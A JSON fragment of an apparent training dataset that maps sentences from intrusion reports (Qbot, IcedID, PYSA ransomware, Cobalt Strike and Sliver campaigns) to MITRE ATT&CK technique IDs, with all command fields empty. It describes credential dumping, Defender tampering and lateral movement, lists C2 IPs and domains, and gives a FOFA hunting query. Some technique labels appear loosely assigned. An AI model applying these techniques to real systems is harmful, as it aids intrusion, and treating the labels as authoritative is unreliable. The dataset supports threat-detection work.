    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Windows Management Instrumentation(WMI)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Four hours after initial access, the threat actor moved laterally to a server using Impacket’s wmiexec and downloaded a ZIP file containing Python and a Cobalt Strike beacon (wo12.py and wo14.py ).",
    "command": "",
    "labels": [
      "T1047",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "These involved instances where the threat actor appear to be moving from the SYSTEM context to a domain administrator account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "While some of the threat actor’s payloads were downloaded from a remote resource they also at times transferred their tooling laterally using SMB, and then executed using WMIC or wmiexec.",
    "command": "",
    "labels": [
      "T1047",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Over the course of the intrusion the threat actor relied on Sliver and Cobalt Strike.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Sliver was used most heavily during the first day of the intrusion with Cobalt Strike then being used over the full length of the intrusion.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The two Cobalt Strike C2 showed the classic HTTP response related to the post-exploitation framework:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "HTTP/1.1 404 Not FoundContent-Type: text/plainDate: Day, DD Mmm YYYY HH:MM:SS GMTContent-Length: 0",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "By diving deeper into the two command and control servers, it was noticed that both of them exposed the HTTP service on port 81 with the following HTTP response.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Therefore, the following FOFA query was built to identify further potential C2 servers matching this pattern.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "\"HTTP/1.1 307 Temporary Redirect\" && \"Content-Type: text/html; charset=utf-8\" && \"Location: https://www.cloudflare.com/\" && \"Content-Length: 63\" && port=\"81\" && protocol=\"http\"",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Some of the first results provided by FOFA via the above-mentioned query were reported by Rapid7 in one of their latest blog posts.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Based on FOFA results, all the identified command and control servers were in Bulgaria and the Netherlands.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Furthermore, we noticed that four IP addresses (91.92.250.158, 91.92.251.240, 94.156.67.175, 94.156.67.180) had an untrusted certificate on port 441 with protocol HTTPS associated with Alibaba, when they were active Cobalt Strike servers.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The certificate serial number (1657766544761773100) was used to identify other possibly used by the same threat actors, and further servers were detected which showed a behavior similar to what was previously described.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "For example, the IP address 185.73.124.238 shares the same certificate and is, at the time of report writing, an active Cobalt Strike C2 server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "As described in a Hunt.io blog post, these specific certificate attributes like CommonName and Organization are associated with the usage of RedGuard which is a C2 redirector.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Both the Sliver servers 194.49.94[.]18 and 194.169.175[.]134 had invalid certificates on port 8443.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The first command uses bcdedit utility to modify and set the default boot configuration of the system to the “safe mode with networking”.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The second command is using findstr to check if the previous command executed successfully.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The following reg commands are used to modify the registry and enable automatic logon using the service account, and add the ransomware binary <REDACTED-COMPANY-NAME>.exe to HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce to be executed on system’s start up.",
    "command": "",
    "labels": [
      "T1078",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The ransomware binary <REDACTED-COMPANY-NAME>.exe executed multiple files and utilities, below are the child and grand child processes showing the behavior of this ransomware binary:",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "As with our previous case, they started by uploading their web shell and disabling antivirus services.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The first was through scheduled tasks, and the second, was via a newly created account.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The account was then added to the “remote desktop users” and “local administrators users” groups.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "After establishing alternative ways of re-entering the targeted host, they enumerated the environment using Windows native programs such as net and ipconfig.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "At the end of their first visit, they disabled LSA protection, enabled WDigest for access to plain text credentials later, dumped the LSASS process memory, and downloaded the results via the web shell.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Approximately 20 seconds after the web shell aspx_wkggiyvttmu.aspx was created, a flurry of POST requests were sent to the web shell.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "At least two parameters are sent in the POST request to the web shell, delimiter which defines what string is used to separate the response, and exec_code which is the command to be ran.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "get – Get file from location on disk (additional dst POST parameter)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "put – Upload file to location (additional dst POST parameter)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This was followed shortly by several commands to impair Windows Defender before downloading and executing a fake dllhost.exe from 148.251.71[.]182.",
    "command": "",
    "labels": [
      "T1105",
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The schedule task runs a batch script called Wininet.bat which was also uploaded through the web shell.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "When executed, the binary was observed resolving the following domains:\napi.myip[.]com (for discovery)\ntcp443.msupdate[.]us\nkcp53.msupdate[.]us",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "As previously noted, we discovered the creation of a Scheduled task from a .xml template that was copied to the server via the web shell.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The scheduled task created by the web shell was set to use the principal SID “S-1-5-18”, or SYSTEM.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Using PowerShell the threat actors issued several commands to impair Windows Defender including:",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Windows Defender Behavior Monitoring was disabled.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The Severe Threat default action was set to ‘Allow’.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Realtime Monitoring was disabled.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The ‘C:\\Windows’ path was excluded from scheduled and real-time scanning.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor created a process memory dump from LSASS.exe.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "In this case they created a “minidump” using the LOLBIN comsvcs.dll.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "This was dropped to disk as ssasl.pmd (lsass.dmp reversed) and then zipped before exfiltration.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors used native Windows binaries to enumerate the exploited server in an automated fashion.",
    "command": "",
    "labels": [
      "T1057",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "These discovery tasks like the rest of the activity observed from this threat actor was executed via the web shell.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "As we saw from the execution section,dllhost.exe was used to access the below domains for C2, which we believe was using a variation of FRP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "tcp443.msupdate[.]us (107.173.231[.]114), kcp53.msupdate[.]us,  (107.173.231[.]114)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This C2 channel was not used very much as most activity was done through the web shell.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The only successful data that was exfiltrated from the environment was the archive containing the LSASS dump.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Here you can see the threat actor using the web shell command to extract it:",
    "command": "",
    "labels": [
      "T1003.001",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Over the course of 8 hours the PYSA/Mespinoza threat actors used Empire and Koadic as well as RDP to move laterally throughout the environment, grabbing credentials from as many systems as possible on the way to their objective.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors took their time, looking for files and reviewing the backup server before executing ransomware on all systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "In this intrusion the entry was a Windows host with RDP exposed to the internet.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors logged in with a valid account (Domain Administrator).",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The login was from a Tor exit node and over the course of an 8 hour intrusion we saw them hand off 2 times, for a total of 3 different Tor exits being used to maintain RDP access to the environment.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The account used to access the first beachhead host had enough privileges to immediately begin lateral movement to a domain controller just minutes after entry.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Network scanning begun on the domain controller followed closely by Empire.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "While the Empire C2 remained active during the whole intrusion, we saw little activity from it, more like a fallback channel should their RDP access fall off.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "As they started to move laterally to other systems, it was very obvious they were following a checklist playbook.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Each time they pivoted, they would check quser, and then dump lsass using Task Manager.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Dump lsass with Taskmanager",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Dump lsass with Procdump",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Dump lsass with comsvcs.dll",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Dump credentials with Invoke-Mimikatz",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Most lateral movement in the environment was via RDP with various legitimate user accounts, as well as PsExec to execute scripts throughout the environment for credential dumping and collection activity.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor disabled security tools throughout the intrusion by using Local Security Policy Editor and MpPreference to disable Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Besides using RDP and Empire the group also used the Offensive Security Tool (OST) Koadic, which bills itself as a post exploitation toolkit that can stay resident in memory using JScript or VBS via Windows Script Host to perform its execution.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Koadic was only utilized on a few key servers and one of those servers included a persistence mechanism using the default Koadic HTA scheduled task module.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "After around 7 hours post initial access, the threat actors began their final actions by RDPing into systems, dropping a PowerShell script and the ransomware executable.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The PowerShell script killed various active processes and made sure RDP was open at the firewall and created what appears to be a potentially unique identifier for systems.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Initial access for this actor was via exposed RDP services.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Originally, the actor connected from 198.96.155.3, and then performed a kind of hand off over the course of the campaign, first to 23.129.64.190 and then finally 185.220.100.240.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors started off by using RDP but also relied on 2 different OSTs during this intrusion.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "A few minutes after gaining access, they moved laterally to a domain controller and then executed a PowerShell launcher for Empire.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "From those two executions, various child processes were created to load stage 2 into memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Persistence was setup using Koadic to schedule a task to execute a HTA file located in the C:\\ProgramData directory at logon as system.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "This will initiate C2 back to the Koadic server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors disabled Windows Defender using Local Group Policy Editor.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Later, they also ran a PowerShell script that would again disable Windows Defender, this time using MpPreference.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The script also targeted Malwarebytes, agents, Citrix, Exchange, Veeam, SQL and many other processes.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "A Defender exclusion was also added to exclude everything with .exe as the extension.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "While established on a domain controller the threat actors also created and accessed a shadow copy of the ntds.dit and most likely exfiltrated it via their Koadic C2 channel.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "We also saw the threat actors save LSA Secrets to disk using the hashdump_sam module in Koadic which runs impacket.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors leveraged many built-in Windows tools for discovery including the following:",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The arp command was run using PowerShell Remoting.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Other local discovery was performed using PowerShell such as ps to list the running process on systems.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "RDP was initiated from the beachhead host to a domain controller using the valid account they had used to gain access to the first host.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "RDP continued to be the first method of choice while accessing various systems around the environment.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors used 3 different C2 channels, RDP, PowerShell Empire, and Koadic.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Since no plaintext exfil was observed we assess that the exfiltration was performed via one of the command and control channels either RDP, Empire, or Koadic.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Two files were dropped via RDP on each system, a PowerShell script and a PYSA ransomware executable.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The purpose of the PowerShell script was to disable security tools that might not have been disabled through-out the intrusion.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Soon after execution of the Qbot payload, the malware established C2 connectivity and created persistence on the beachhead.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "This level of access was abused to deploy additional Cobalt Strike beacons and consequently pivot to other sensitive hosts within the network.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors gained initial access to a Windows workstation through the execution of a malicious DLL.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Various automated discovery commands were used to map the network topology, retrieve local group member information, and list available file shares/privileges of the infected user.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Finally, documents were stolen and exfiltrated through Cobalt Strike encrypted C2 channel (HTTPS).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "When run for the first time, the script creates a new registry key entry in the same path, saving the date of execution.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "OR (2) Fetch the QBot payload remotely using one of the active C2 IPs using the Invoke-WebRequest PowerShell module:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution of this second-stage DLL, various registry keys were created in HKCU\\Software\\Microsoft\\Yerqbqokc.In addition, a new instance of explorer.exe (32-bit) was started and injected into.",
    "command": "",
    "labels": [
      "T1055",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The combination of these two flaws could allow an attacker to completely compromise the authentication, and thus to impersonate a server of their choice.”",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "After being successfully authenticated, the DC password was set:",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "A connection was performed from the beachhead to the Domain Controller using the DC account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "After authenticating to the DC with the DC account, the threat actors dumped the Domain Admin hash, and then reset the DC password in order to unbreak the Active Directory Domain.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution of the initial DLL, QBot uses process hollowing to start a suspended instance of explorer.exe (32-bit) and then injects itself into this process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The injected explorer.exe process was used to spawn and inject into additional instances of explorer.exe (32-bit).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Source PID 10492 belonging to QBot, injected a DLL into PID 4072 which we discovered was part of Cobalt Strike C2 communication.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor obtained the NTLM hash value of the administrator account through the Zerologon exploit and used over-pass-the-hash to request a TGT from the domain controller.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "QBot initially starts a number of processes to collect information about the affected system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "This is part of the “SYSTEM INFO” bot request, as described in a recent article from SecureList.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Later, more discovery commands were executed via the Cobalt Strike beacon, which gathered information about the active directory environment.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Ping was used to verify machines were online",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Various commands were executed to enable the RDP service on various hosts:",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor then established interactive administrative RDP sessions and pivoted to different hosts in the network.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Here is the initial access DLL (Qbot) information from Tria.ge",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This Cobalt Strike server was added to our Threat Feed on 2021-11-16.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors were most interested in files concerning financial statements, ransomware reports, and salary data.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The C2 channel was encrypted and multiple connections were established with the internal file server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "At 17:35 UTC, the Cobalt Strike Beacon was deployed on the File Server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Following the opening of the xls document, the initial Qbot DLL loader was downloaded and saved to disk.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Once executed, the Qbot process creates a scheduled task to elevate itself to system.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Qbot injected into many processes but one favorite in this intrusion, was Microsoft Remote Assistance (msra.exe).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Within minutes of landing on the beachhead, a series of discovery commands were executed using Microsoft utilities.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Around the same time, LSASS was access by Qbot to collect credentials from memory.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "After this activity, normal beaconing occurred but no further actions on objectives were seen.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The QBot dll was executed on the system and shortly after, injected into the msra.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "A scheduled task was created by Qbot to escalate to SYSTEM privileges.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "This scheduled task was created by the msra.exe process, to be run only once, a few minutes after its creation.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "QBot was observed injecting into msra.exe process on multiple systems.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Multiple folders were added to the Windows Defender Exclusions list in order to prevent the Qbot dll placed inside of it from being detected.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The newly dropped dll was then executed and process injected into msra.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Qbot used reg.exe to add Defender folder exceptions for folders within AppData and ProgramData.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "dll files dropped by Qbot, were deleted after injection into msra.exe.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "LSASS was accessed by Qbot, with the intention of accessing credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "This can be observed through the Sysmon process access event, indicating the GrantedAccess value of 0x1410.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Additional evidence of LSASS access was visible in API calls from Qbot injected processes to LSASS.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The following discovery commands where observed coming from the Qbot processes.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Qbot moved laterally to all workstations in the environment by copying a dll to the machine and then remotely creating a service to execute the Qbot dll.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The services created had the DeleteFlag set causing the service to be removed upon reboot.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The lateral movement activity from the beachhead host was rapid and connections were seen across all workstations in the network.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "A view from the memory of the beachhead host shows the injected msra process connecting to hosts across the network.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The service creations were also observed via event id 7045 across all hosts.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Qbot uses a tiered infrastructure, often using other compromised systems as first tier proxy points for establishing a constantly changing list of C2 endpoints.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "With this type of setup the list of C2 from October 2021, has in large rotated out of use.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "To keep up to date on current Qbot C2 endpoints you can check out our Threat Feed & All Intel service as we track these changing lists daily.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Qbot does use SSL in it’s C2 communication but does not rely soley on port 443 for communication, in the case investigated here the following ports were found in the extracted C2 configuration.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Qbot uses SSL and while the domains do not resolve, they follow a pattern and are detectable with several Suricata ETPRO signatures.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike and RDP were used to move across the network before using WMI and PsExec to deploy the Quantum ransomware.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Upon this execution of the IcedID DLL, a battery of discovery tasks were executed using built-in Windows utilities like ipconfig, systeminfo, nltest, net, and chcp.",
    "command": "",
    "labels": [
      "T1016",
      "T1082",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The IcedID malware also created a scheduled task as a means of persistence on the beachhead host.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Around two hours later, Cobalt Strike was deployed using process hollowing and injection techniques.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This marked the start of “hands-on-keyboard” activity by the threat actors.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors gathered host based network information by running a batch script named ns.bat, which ran nslookup for each host in the environment.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike process then proceeded to access LSASS memory to extract credentials, which a few minutes later were tested to run remote WMI discovery tasks on a server.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1047",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "After confirming their credentials worked with the WMI actions, the threat actor proceeded to RDP into that server, and attempted to drop and execute a Cobalt Strike DLL beacon on that server.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This appeared to fail so the threat actor then opened cmd and proceeded to execute a PowerShell Cobalt Strike Beacon.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This Beacon was successful in connecting to the same command and control server observed on the beachhead host.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "For the next hour, the threat actor proceeded to make RDP connections to other servers in the environment.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Once the threat actor had a handle on the layout of the domain, they prepared to deploy the ransomware by copying the ransomware (named ttsel.exe) to each host through the C$ share folder.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "They used two methods of remote execution to detonate the ransomware binary, WMI and PsExec.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The payload was delivered within an ISO file, docs_invoice_173.iso, via email, where a user opened and executed the malware.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The file document.lnk is a shortcut or lnk file and dar.dll was the IcedID payload.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "We were able to determine when the user clicked on the lnk file and when a new process was created with the command line mentioned above.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after execution of the payload, several child processes were spawned that created persistence and began discovery on the host.",
    "command": "",
    "labels": [
      "T1016",
      "T1053.005",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "This included an instance of C:\\Windows\\SysWOW64\\cmd.exe, which the IcedID malware used to hollow out and then inject a Cobalt Strike beacon into.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The cmd.exe process spawned a suspicious instance of rundll32.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "A further indication was the rundll32.exe process creating a named pipe, postex_304a. This behavior of rundll32.exe and a named pipe that matches postex_[0-9a-f]{4}, is the default behavior used by Cobalt Strike 4.2+ post exploitation jobs.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "When we reviewed the memory of this process, we were able to confirm it was in fact Cobalt Strike when we successfully extracted the beacon configuration (additional details can be found in the Command and Control section).",
    "command": "",
    "labels": [
      "T1003.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor also executed a PowerShell Cobalt Strike payload on some servers:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
